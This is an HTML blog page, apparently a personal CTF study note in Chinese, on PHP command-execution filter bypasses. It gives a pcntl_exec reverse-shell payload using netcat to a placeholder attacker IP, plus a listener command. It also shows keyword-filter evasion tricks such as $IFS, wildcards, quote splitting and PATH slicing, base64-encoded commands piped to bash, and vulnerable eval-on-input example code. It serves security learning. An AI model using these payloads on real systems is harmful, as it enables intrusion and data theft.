@@ -1,0 +1,735 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>简单的php命令（二） | 蒜鸟的鸟巢</title><meta name="author" content="Garlic-dove"><meta name="copyright" content="Garlic-dove"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="继续简单学点php命令执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="简单的php命令（二）">
+<meta property="og:url" content="https://garlic-dove.github.io/2026/01/19/php%E5%91%BD%E4%BB%A42/index.html">
+<meta property="og:site_name" content="蒜鸟的鸟巢">
+<meta property="og:description" content="继续简单学点php命令执行">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garlic-dove.github.io/image/20.avif">
+<meta property="article:published_time" content="2026-01-19T12:27:15.000Z">
+<meta property="article:modified_time" content="2026-01-29T12:32:42.745Z">
+<meta property="article:author" content="Garlic-dove">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garlic-dove.github.io/image/20.avif"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "简单的php命令（二）",
+  "url": "https://garlic-dove.github.io/2026/01/19/php%E5%91%BD%E4%BB%A42/",
+  "image": "https://garlic-dove.github.io/image/20.avif",
+  "datePublished": "2026-01-19T12:27:15.000Z",
+  "dateModified": "2026-01-29T12:32:42.745Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Garlic-dove",
+      "url": "https://garlic-dove.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/image/ss.jpg"><link rel="canonical" href="https://garlic-dove.github.io/2026/01/19/php%E5%91%BD%E4%BB%A42/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//www.clarity.ms"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8b7a940f932af656bd51538c1716c577";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-5E0P16XE8R"></script><script>window.dataLayer = window.dataLayer || []
+function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date())
+gtag('config', 'G-5E0P16XE8R')
+btf.addGlobalFn('pjaxComplete', () => {
+  gtag('config', 'G-5E0P16XE8R', {'page_path': window.location.pathname})
+}, 'google_analytics')
+</script><script>(function(c,l,a,r,i,t,y){
+    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+})(window, document, "clarity", "script", "tsgv6t9ion");
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":true,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '简单的php命令（二）',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style type="text/css">#toggle-sidebar {bottom: 80px}</style><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (true) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/gg.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/20.avif);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/image/nn.gif" alt="Logo" loading='lazy'><span class="site-name">蒜鸟的鸟巢</span></a><a class="nav-page-title" href="/"><span class="site-name">简单的php命令（二）</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">简单的php命令（二）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-19T12:27:15.000Z" title="发表于 2026-01-19 20:27:15">2026-01-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-29T12:32:42.745Z" title="更新于 2026-01-29 20:32:42">2026-01-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="更多绕过"><a href="#更多绕过" class="headerlink" title="更多绕过"></a>更多绕过</h1><h2 id="pcntl-exec-函数"><a href="#pcntl-exec-函数" class="headerlink" title="pcntl_exec()函数"></a>pcntl_exec()函数</h2><ul>
+<li><code>pcntl_exec()</code>：如果没有回显<ol>
+<li>方法一：cat文件并输出到有权限读取路径</li>
+<li>方法二：shell反弹</li>
+</ol>
+</li>
+<li>POST提交（例）<blockquote>
+<p><code>cmd=pcntl_exec(&quot;/bin/bash&quot;.array(&quot;-c&quot;,&quot;nc xxx.xxx.xxx.xxx xxxx -e /bin/bash&quot;));</code></p>
+<ul>
+<li>参数<code>path</code>：<code>&quot;/bin/bash&quot;</code></li>
+<li>参数<code>args</code>：以数组的形式包裹起来</li>
+<li><code>-c</code>：执行二进制文件</li>
+<li><code>nc</code>：反弹tcp连接到kali，kali监听端口（<code>xxx.xxx.xxx.xxx xxxx</code>）</li>
+<li><code>-e /bin/bash</code>：返回命令行交互界面</li>
+</ul>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp xxxx  <span class="comment">#在端口xxxx启动监听</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#访问触发PHP代码执行后，会建立反向Shell会话，这里将获得目标服务器的Shell</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="操作系统链接符"><a href="#操作系统链接符" class="headerlink" title="操作系统链接符"></a>操作系统链接符</h2><table>
+<thead>
+<tr>
+<th align="center">链接符</th>
+<th align="left">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>;</code>（分号）</td>
+<td align="left">使多个命令按顺序执行，分号前后的命令都会执行</td>
+</tr>
+<tr>
+<td align="center"><code>&amp;</code></td>
+<td align="left">使命令在后台运行，可以<strong>同时</strong>执行多条命令</td>
+</tr>
+<tr>
+<td align="center"><code>&amp;&amp;</code></td>
+<td align="left">第一条命令执行成功，则执行后面的命令否则无法执行</td>
+</tr>
+<tr>
+<td align="center"><code>|</code></td>
+<td align="left">将前面的命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数，只显示后面的命令执行结果</td>
+</tr>
+<tr>
+<td align="center"><code>||</code></td>
+<td align="left">类似if-else语句：如果前面的命令执行成功，则后面的命令就不会执行，反之则执行</td>
+</tr>
+</tbody></table>
+<h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例题</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;# #&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);  <span class="comment">//把cmd参数里的空格替换为第二个参数&quot;&quot;里的符号</span></span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;过滤后的命令：&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;命令执行结果如下：&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>大括号：<code>&#123;cat,flag.txt&#125;</code></li>
+<li><code>$IFS</code>代替空格：<ol>
+<li>Linux下有一个特殊的环境变量叫做内部字段分隔符<code>$IFS</code>（internal field separator）</li>
+<li>单纯的$IFS会被bash解释器当作变量名，输不出来结果，加个{}固定变量名<code>$&#123;IFS&#125;</code></li>
+<li>后面加个$与{}类似，起截断作用，$9是当前系统shell教程第九个参数持有者为空字符串<code>$IFS$9</code></li>
+</ol>
+</li>
+<li>重定向字符<code>&lt;</code>、<code>&lt;&gt;</code>：<code>&lt;</code>表示的是输入定向的意思，就是把<code>&lt;</code>后面的文件取代键盘作为新的输入设备</li>
+<li>URL编码：<ul>
+<li><code>%09</code> &#x3D; <code>Tab</code></li>
+<li><code>%20</code> &#x3D; <code>space</code>（空格）</li>
+</ul>
+</li>
+</ul>
+<h2 id="文件名过滤绕过"><a href="#文件名过滤绕过" class="headerlink" title="文件名过滤绕过"></a>文件名过滤绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例题</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>,<span class="variable">$cmd</span>))&#123;    <span class="comment">//flag、system、php被过滤</span></span><br><span class="line">    <span class="title function_ invoke__">evel</span>(<span class="variable">$cmd</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;指令已被过滤&quot;</span>；</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>通配符：<code>?</code>、<code>*</code><ul>
+<li><code>?</code>：Linux里面可以用来代替字母，仅代表单个字符且该单字必须存在</li>
+<li><code>*</code>：Linux里面可以进行模糊匹配，代表任何字符串<blockquote>
+<p>#cat flag.php<br>#cat f??g.?hp<br>#cat f*</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>单引号、双引号<code>&quot;&quot;</code>、<code>&#39;&#39;</code>：在php中被视为符号，执行指令时被视为空字符<blockquote>
+<p>#cat fl’’ag.ph””p  （如果指令外部有引号包裹，记得区分，分开引用或<code>\</code>引用）</p>
+</blockquote>
+</li>
+<li>反斜线<code>\</code>：<ul>
+<li>把特殊符号去掉功能性，单纯表示为字符串</li>
+<li>命令连接符：把被空格，换行符分开的指令字符串拼接后执行<blockquote>
+<p>#cat fl\ag.t\xt</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>特殊变量<code>$1</code>到<code>$9</code>、<code>$@</code>和<code>$*</code>：输出为空<blockquote>
+<p>#cat fl$1ag.t$9xt<br>#cat fl$@ag.t$*xt</p>
+</blockquote>
+</li>
+<li>内联执行：自定义字符串，再拼接起来<blockquote>
+<p>#a&#x3D;f;d&#x3D;ag;c&#x3D;l;cat $a$c$d.txt（表示cat flag.txt）</p>
+</blockquote>
+</li>
+<li>利用Linux中的环境变量：使用环境变量里的字符执行变量<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games;/usr/local/games:/snap/bin  <span class="comment">#PATH默认系统系统变量</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> f<span class="variable">$&#123;PATH:5:1&#125;</span><span class="variable">$&#123;PATH:8:1&#125;</span><span class="variable">$&#123;PATH:66:1&#125;</span>.<span class="variable">$&#123;PATH:93:1&#125;</span>h<span class="variable">$&#123;PATH:93:1&#125;</span></span><br><span class="line"><span class="comment">#$&#123;PATH:x:y&#125;：使用环境PATH里的第x个字符（从0开始计数，“/为第0个字符”），从第x个开始显示y个字符</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="常见文件读取命令绕过"><a href="#常见文件读取命令绕过" class="headerlink" title="常见文件读取命令绕过"></a>常见文件读取命令绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例题</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|cat|sort|shell|\&#x27;/i&quot;</span>,<span class="variable">$cmd</span>))&#123;    <span class="comment">//flag、php、cat、sort、shell、\&#x27;被过滤</span></span><br><span class="line">    <span class="title function_ invoke__">evel</span>(<span class="variable">$cmd</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;指令已被过滤&quot;</span>；</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>tac</code>：与<code>cat</code>的功能类似，但是反向读取文件内容，从最后一行往前开始读取显示（每一行内容顺序不变）<blockquote>
+<p>#tac fl\ag.p\hp</p>
+</blockquote>
+</li>
+<li><code>more</code>：一页一页的显示档案内容<blockquote>
+<p>#more fl\ag.p\hp</p>
+</blockquote>
+</li>
+<li><code>less</code>：与<code>more</code>类似<blockquote>
+<p>#less fl\ag.p\hp</p>
+</blockquote>
+</li>
+<li><code>tail</code>：查看末尾几行（默认显示最后10行）<blockquote>
+<p>tail fl\ag.p\hp</p>
+</blockquote>
+</li>
+<li><code>nl</code>：显示的时候会输出行号（与<code>cat</code>功能类似）<blockquote>
+<p>#nl fl\ag.p\hp</p>
+</blockquote>
+</li>
+<li><code>od</code>：以二进制的方式读取档案内容<blockquote>
+<p>#od -A d -c fl\ag.p\hp  （<code>-A d -c</code>让二进制的ASCII码值显示其代表的字符）</p>
+</blockquote>
+</li>
+<li><code>xxd</code>：与<code>od</code>类似，但会直接在二进制文本旁显示原字符<blockquote>
+<p>#xxd fl\ag.p\hp</p>
+</blockquote>
+</li>
+<li><code>sort</code>：主要用于排序文件<blockquote>
+<p>#&#x2F;usr&#x2F;bin&#x2F;s?rt fl\ag.p\hp  （直接用sort会被过滤）</p>
+</blockquote>
+</li>
+<li><code>uniq</code>：报告或删除文件中重复的行<blockquote>
+<p>#uniq fl\ag.p\hp</p>
+</blockquote>
+</li>
+<li><code>file -f</code>：报错出具体内容（以每行的内容作为文件读取）<blockquote>
+<p>#file -f fla\g.p\hp</p>
+</blockquote>
+</li>
+<li><code>grep</code>：在文本中查找指定的字符串<blockquote>
+<p>#grep fla fla*  （从fla*文本文件中搜索显示包含“fla”字符串的行）</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例题</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|cat|sort|shell/i&quot;</span>,<span class="variable">$cmd</span>))&#123;    <span class="comment">//flag、php、cat、sort、shell被过滤</span></span><br><span class="line">    <span class="title function_ invoke__">evel</span>(<span class="variable">$cmd</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;指令已被过滤&quot;</span>；</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>原理：<br>命令编码后的字符串 &rarr;（绕过过滤）&rarr; 目标服务器 &rarr;（解码读取命令）&rarr; 执行命令</p>
+</blockquote>
+<ul>
+<li>base64编码<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">S = <span class="string">b&#x27;cat flag.php&#x27;</span></span><br><span class="line">e64 = base64.b64encode(S)  <span class="comment">#参数S的类型必须是字节包（bytes）</span></span><br><span class="line"><span class="built_in">print</span>(e64)  <span class="comment">#cat flag.php -&gt; Y2F0IGZsYWcucGhw（编码）</span></span><br><span class="line"><span class="comment">#其他工具Burpsuite、CaptfEncoder、Github</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IGZsYWcucGhw&quot;</span> | <span class="built_in">base64</span> -d | /bin/bash  <span class="comment">#解码读取命令并执行</span></span><br><span class="line"><span class="comment">#或</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IGZsYWcucGhw&quot;</span> | <span class="built_in">base64</span> -d | bash  <span class="comment">#1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IGZsYWcucGhw&quot;</span> | <span class="built_in">base64</span> -d | sh  <span class="comment">#2</span></span><br><span class="line">`<span class="built_in">echo</span> <span class="string">&quot;Y2F0IGZsYWcucGhw&quot;</span> | <span class="built_in">base64</span> -d`  <span class="comment">#3</span></span><br><span class="line">$(<span class="built_in">echo</span> <span class="string">&quot;Y2F0IGZsYWcucGhw&quot;</span> | <span class="built_in">base64</span> -d)  <span class="comment">#4</span></span><br></pre></td></tr></table></figure></li>
